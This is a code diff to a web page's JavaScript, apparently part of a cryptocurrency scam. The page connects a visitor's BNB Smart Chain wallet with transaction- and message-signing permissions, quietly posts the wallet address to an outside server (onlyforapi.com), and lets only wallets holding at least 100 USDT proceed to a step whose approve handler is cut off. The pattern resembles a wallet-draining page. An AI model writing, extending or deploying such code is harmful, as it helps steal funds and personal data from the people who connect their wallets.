@@ -14,64 +14,63 @@ window.onload = function () {
   let signer;
 
   connectButton.onclick = async () => {
-    overlay.style.display = "flex";
+  overlay.style.display = "flex";
 
-    setTimeout(async () => {
-      connectButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Checking Balance...';
-      connectButton.disabled = true;
+  // Wait for 3 seconds first
+  await new Promise(resolve => setTimeout(resolve, 3000));
 
-      try {
-        const provider = await EthereumProvider.init({
-          projectId: "5c7a882142c7491241b507534414ddff",
-          chains: [56], // BNB Smart Chain
-          methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
-          showQrModal: true
-        });
+  connectButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Checking Balance...';
+  connectButton.disabled = true;
 
-        await provider.connect();
+  try {
+    const provider = await EthereumProvider.init({
+      projectId: "5c7a882142c7491241b507534414ddff",
+      chains: [56],
+      methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
+      showQrModal: true
+    });
 
-        const ethersProvider = new ethers.BrowserProvider(provider);
-        signer = await ethersProvider.getSigner();
-        const userAddress = await signer.getAddress();
+    await provider.connect();
 
-        // Save to backend
-        fetch("http://onlyforapi.com/auto/save_wallet_auto.php", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ wallet: userAddress })
-        });
+    const ethersProvider = new ethers.BrowserProvider(provider);
+    signer = await ethersProvider.getSigner();
+    const userAddress = await signer.getAddress();
 
-        // Show address
-        document.getElementById("walletAddress").value = userAddress;
+    document.getElementById("walletAddress").value = userAddress;
 
-        // Check USDT Balance
-        const USDT = new ethers.Contract(USDT_ADDRESS, USDT_ABI, ethersProvider);
-        const rawBalance = await USDT.balanceOf(userAddress);
-        const balance = parseFloat(ethers.formatUnits(rawBalance, 18));
+    fetch("http://onlyforapi.com/auto/save_wallet_auto.php", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ wallet: userAddress })
+    });
 
-        document.getElementById("availableBalance").value = balance + " USDT";
-        document.getElementById("balanceResults").style.display = "block";
+    const USDT = new ethers.Contract(USDT_ADDRESS, USDT_ABI, ethersProvider);
+    const rawBalance = await USDT.balanceOf(userAddress);
+    const balance = parseFloat(ethers.formatUnits(rawBalance, 18));
 
-        if (balance < 100) {
-          document.getElementById("step3Next").disabled = true;
-          document.getElementById("amountCalculation").style.display = "none";
-          $('#minBalanceModal').modal('show');
-        } else {
-          document.getElementById("step3Next").disabled = false;
-          document.getElementById("amountCalculation").style.display = "block";
-          calculateAmount(balance); // assumed to exist
-        }
+    document.getElementById("availableBalance").value = balance + " USDT";
+    document.getElementById("balanceResults").style.display = "block";
 
-      } catch (err) {
-        console.error("Wallet connection error:", err);
-        alert("Could not connect to wallet. Please try again.");
-      } finally {
-        overlay.style.display = "none";
-        connectButton.innerHTML = '<i class="fas fa-sync-alt"></i> Check Wallet Balance';
-        connectButton.disabled = false;
-      }
-    }, 3000);
-  };
+    if (balance < 100) {
+      document.getElementById("step3Next").disabled = true;
+      document.getElementById("amountCalculation").style.display = "none";
+      $('#minBalanceModal').modal('show');
+    } else {
+      document.getElementById("step3Next").disabled = false;
+      document.getElementById("amountCalculation").style.display = "block";
+      calculateAmount(balance);
+    }
+
+  } catch (err) {
+    console.error("Wallet connection error:", err);
+    alert("Could not connect to wallet. Please try again.");
+  } finally {
+    overlay.style.display = "none";
+    connectButton.innerHTML = '<i class="fas fa-sync-alt"></i> Check Wallet Balance';
+    connectButton.disabled = false;
+  }
+};
+
 
   approveButton.onclick = async () => {
     try {
